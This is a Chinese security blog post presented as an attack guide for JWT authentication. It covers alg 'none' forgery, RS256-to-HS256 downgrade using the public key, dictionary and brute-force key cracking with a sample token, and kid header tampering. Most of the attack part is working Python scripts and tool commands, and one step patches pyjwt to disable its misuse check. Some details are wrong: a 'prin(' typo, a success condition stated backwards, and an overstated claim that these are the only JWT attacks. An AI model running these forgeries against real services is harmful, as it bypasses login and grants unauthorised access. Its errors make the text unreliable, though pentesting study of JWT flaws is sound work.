> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.anquanke.com](https://www.anquanke.com/post/id/225947)

[![](https://p3.ssl.qhimg.com/t01c03bc7ff7bd694cf.jpg)](https://p3.ssl.qhimg.com/t01c03bc7ff7bd694cf.jpg)

> 最近工作中测试一款客户端 exe 程序，web 框架基于 CEF，认证用的是 jwt。说实话 jwt 这个东西实际运用真的很少，前几年完整撸过一次，结果这次又碰到了就基本忘光了之前的测试过程和方向，于是又重新学习，在查阅了大量的国内以及国外文献后，经过大量的代码编写以及测试，写下此篇攻击指南

可以很负责任的说，目前针对 jwt 攻击测试的方案

有且仅有以下几种：

*   **重置空加密算法**
*   **非对称加密向下降级为对称加密**
*   **暴力破解密钥**
*   **篡改 jwt header，kid 指定攻击**

JWT 在线解析地址：[https://jwt.io/](https://jwt.io/)

重置空加密算法
-------

如图，当前 jwt 指定的 alg 为 HS256 算法

[![](https://p0.ssl.qhimg.com/t01d862e4e8426de2ce.png)](https://p0.ssl.qhimg.com/t01d862e4e8426de2ce.png)

将其修改为 none，然后输出（如果没有 jwt 模块，需要 pip install pyjwt 一下）

```
import jwt

print(jwt.encode({"userName":"admin","userRoot":1001}, key="", algorithm="none"))
```

[![](https://p1.ssl.qhimg.com/t01fe6bb93356228657.png)](https://p1.ssl.qhimg.com/t01fe6bb93356228657.png)

删掉最后的 **“.”** ，然后带入原有的数据包进行发包测试，看 server 端是否接受 none 算法，从而绕过了算法签名。

非对称加密向下降级为对称加密
--------------

现在大多数应用使用的算法方案都采用 RSA 非对称加密，server 端保存私钥，用来签发 jwt，对传回来的 jwt 使用公钥解密验证。

碰到这种情况，我们可以修改 alg 为 HS256 对称加密算法，然后使用我们可以获取到的公钥作为 key 进行签名加密，这样一来，当我们将 jwt 传给 server 端的时候，server 端因为默认使用的是公钥解密，而算法为修改后的 HS256 对称加密算法， 所以肯定可以正常解密解析，从而绕过了算法限制。

当 server 端严格指定只允许使用 HMAC 或者 RSA 算法其中一种时候，那这种攻击手段是没有效果的。

附上降级转型的 python 代码：

```
import jwt
import sys
import re
import argparse


class HMACAlgorithm(jwt.algorithms.HMACAlgorithm):
    def prepare_key(self, key):
        key = jwt.utils.force_bytes(key)
        return key

jwt.api_jwt._jwt_global_obj._algorithms['HS256'] = \
        HMACAlgorithm(HMACAlgorithm.SHA256)

parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        description='''Re-sign a JWT with a public key,
        changing its type from RS265 to HS256.''')
parser.add_argument('-j', '--jwt-file', dest='jwt_file',
        default='jwt.txt', metavar='FILE',
        help='''File containing the JWT.''')
parser.add_argument('-k', '--key-file', dest='keyfile',
        default='key.pem', metavar='FILE',
        help='''File containing the public PEM key.''')
parser.add_argument('-a', '--algorithm', dest='algorithm',
        default='RS256', metavar='ALGO',
        help='''Original algorithm of the JWT.''')
parser.add_argument('-n', '--no-vary', dest='no_vary',
        default=False, action='store_true',
        help='''Sign only once with the exact key given.''')
args = parser.parse_args()

with open(args.keyfile, 'r') as f:
    try:
        pubkey = f.read()
    except: 
        sys.exit(2)

with open(args.jwt_file, 'r') as f:
    try:
        token = f.read().translate(None, '\n ')
    except: 
        sys.exit(2)

try:
    jwt.decode(token, pubkey, algorithms=args.algorithm)
except jwt.exceptions.InvalidSignatureError:
    sys.stderr.write('Wrong public key! Aborting.')
    sys.exit(1)
except: 
    pass

claims = jwt.decode(token, verify=False)
headers = jwt.get_unverified_header(token)
del headers['alg']
del headers['typ']

if args.no_vary:
    sys.stdout.write(jwt.encode(claims, pubkey, algorithm='HS256',
                headers=headers).decode('utf-8'))
    sys.exit(0)

lines = pubkey.rstrip('\n').split('\n')
if len(lines) < 3:
    sys.stderr.write('''Make sure public key is in a PEM format and
            includes header and footer lines!''')
    sys.exit(2)

hdr = pubkey.split('\n')[0]
ftr = pubkey.split('\n')[-1]
meat = ''.join(pubkey.split('\n')[1:-1])

sep = '\n-----------------------------------------------------------------\n'
for l in range(len(hdr), len(meat)+1):
    secret = '\n'.join([hdr] + filter(
        None,re.split('(.{%s})' % l, meat)) + [ftr])
    sys.stdout.write(
            '%s--- JWT signed with public key split at lines of length %s: ---%s%s' % \
            (sep, l, sep, jwt.encode(claims, secret, algorithm='HS256',
                headers=headers).decode('utf-8')))
    secret += '\n'
    sys.stdout.write(
            '%s------------- As above, but with a trailing newline: ------------%s%s' % \
            (sep, sep, jwt.encode(claims, secret, algorithm='HS256',
                headers=headers).decode('utf-8')))
```

注意，因为 jwt 模块更新后，防止滥用，加入了强校验，如果指定算法为 HS256 而提供 RSA 的公钥作为 key 时会报错，无法往下执行，需要注释掉 **site-packages/jwt/algorithm.py** 中的如下四行：

[![](https://p2.ssl.qhimg.com/t01bc311e945bb7df7b.png)](https://p2.ssl.qhimg.com/t01bc311e945bb7df7b.png)

再把整个 python 代码流程精简一下，使用以下脚本即可，public.pem 为 RSA 公钥：

```
# -*- coding: utf-8 -*-

import jwt

public = open('public.pem', 'r').read()
prin(jwt.encode({"user":"admin","id":1}, key=public, algorithm='HS256'))
```

[![](https://p1.ssl.qhimg.com/t0138f6f20f2bc30966.png)](https://p1.ssl.qhimg.com/t0138f6f20f2bc30966.png)

暴力破解密钥
------

当 alg 指定 HMAC 类对称加密算法时，可以进行针对 key 的暴力破解

其核心原理即为 jwt 模块的 decode 验证模式，

```
jwt.decode(jwt_json, verify=True, key='')
```

1.  签名直接校验失败，则 key 为有效密钥；
2.  因数据部分预定义字段错误：

*   jwt.exceptions.ExpiredSignatureError
*   jwt.exceptions.InvalidAudienceError
*   jwt.exceptions.InvalidIssuedAtError
*   jwt.exceptions.InvalidIssuedAtError
*   jwt.exceptions.ImmatureSignatureError 导致校验失败，说明并非密钥错误导致，则 key 也为有效密钥；

1.  因密钥错误
    
    *   jwt.exceptions.InvalidSignatureError
    
    导致校验失败，则 key 为无效密钥；
    
2.  因其他原因（如，jwt 字符串格式错误）导致校验失败，无法验证当前 key 是否有效。

综上分析，构造字典爆破脚本：

```
import jwt

jwt_json='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJpZCI6MX0.S5iudTeUBkKZa2Ah_MR_JdAsSBUFrnF3kn1FL-Cvsks'
with open('dict.txt',encoding='utf-8') as f:
        for line in f:
            key = line.strip()
            try:
                jwt.decode(jwt_json,verify=True,key=key,algorithm='HS256')
                print('found key! --> ' +  key)
                break
            except(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):
                print('found key! --> ' +  key)
                break
            except(jwt.exceptions.InvalidSignatureError):
                print('verify key! -->' + key)
                continue
        else:
            print("key not found!")
```

运行后可以看到，成功爆破了 key 为 **abc123**

[![](https://p3.ssl.qhimg.com/t017d34faaba6bb2cf2.png)](https://p3.ssl.qhimg.com/t017d34faaba6bb2cf2.png)

如果没有字典，可以采取暴力遍历，可以直接使用 npm 安装 **jwt-cracker** , 方便快捷

```
npm install jwt-cracker
```

使用方法：

```
> jwt-cracker "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJpZCI6MX0.S5iudTeUBkKZa2Ah_MR_JdAsSBUFrnF3kn1FL-Cvsks" "abcde0123456" 6
```

[![](https://p3.ssl.qhimg.com/t0121e9816168a5b597.png)](https://p3.ssl.qhimg.com/t0121e9816168a5b597.png)

篡改 jwt header，kid 指定攻击
----------------------

kid 即为 key ID ，存在于 jwt header 中，是一个可选的字段，用来指定加密算法的密钥

[![](https://p0.ssl.qhimg.com/t01b4d3a2c6c152cf54.png)](https://p0.ssl.qhimg.com/t01b4d3a2c6c152cf54.png)

如图，在头部注入新的 kid 字段，并指定 HS256 算法的 key 为 1，生成新的 jwt_json

```
jwt.encode({"name":"admin","id":1},key="1",algorithm='HS256',headers={"kid":"1"})
```

[![](https://p1.ssl.qhimg.com/t016e09a59bbfd92e4a.png)](https://p1.ssl.qhimg.com/t016e09a59bbfd92e4a.png)

验证没有问题：

[![](https://p5.ssl.qhimg.com/t01627148caad336feb.png)](https://p5.ssl.qhimg.com/t01627148caad336feb.png)

如果 server 端开启了头部审查，那么此方法也将没有效果

另外，可以构造 kid 进行 SQL 注入、任意文件读取、命令执行等攻击，但是除了 CTF 中会有这种强行弱智写法，实际案例可以说是并不存在，实用性极其低，故不再赘述。

小结
--

以上四种攻击方式可以说是涵盖了已知所有的针对 jwt 的利用，还有一部分没有实际用处或者根本就不存在的东西，没有必要去浪费笔墨，读者也没有必要来浪费时间看。